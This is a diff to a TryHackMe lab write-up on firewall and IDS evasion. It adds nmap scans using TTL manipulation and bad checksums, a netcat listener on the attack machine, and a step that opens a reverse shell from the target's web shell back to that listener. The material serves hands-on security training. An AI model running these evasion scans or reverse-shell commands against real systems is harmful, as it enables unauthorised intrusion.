@@ -12,6 +12,9 @@ This writeup was last updated: 08/15/2023
 
 ## Evasion via Modifying Header Fields
 
+### Set TTL
+
+1. `nmap -ttl 2 <TARGET IP>`
 ```Bash
 root@ip-10-10-216-160:~# nmap -ttl 2 10.10.21.218
 
@@ -28,8 +31,9 @@ MAC Address: 02:21:EC:C8:1A:51 (Unknown)
 Nmap done: 1 IP address (1 host up) scanned in 17.96 seconds
 ```
 
-## Evasion via Modifying Header Fields
+### Use a Wrong Checksum
 
+1. `nmap --badsum <TARGET IP>`
 ```Bash
 root@ip-10-10-216-160:~# nmap --badsum 10.10.21.218
 
@@ -64,14 +68,19 @@ Connection from 10.10.87.92 38304 received!
 
 ## Evasion Using Port Tunneling
 
+1. `nc -lvnp <PORT NUMBER>` from our attack machine to open up a netcat listener that'll listen for any inbound connection using FTP's default port
 ```Bash
 root@ip-10-10-173-37:~# nc -lvnp 21
 Listening on [0.0.0.0] (family 0, port 21)
 ```
 
-![]()
+2. `<TARGET IP>:8080` to open up our target machine's web shell
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Evasion%20Using%20Port%20Hopping%20pt1.png)
+
+4. `nc <MACHINE IP> <PORT NUMBER>` from the target machine's web shell to spawn a reverse shell that'll connect back to our netcat listener
+
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Evasion%20Using%20Port%20Port%20Tunneling%20pt1.png)
 
 ```Bash
 Listening on [0.0.0.0] (family 0, port 21)
@@ -102,4 +111,4 @@ Accept-Ranges: bytes
 </html>
 ```
 
-# Evasion Using Non-Standard Ports
+## Evasion Using Non-Standard Ports
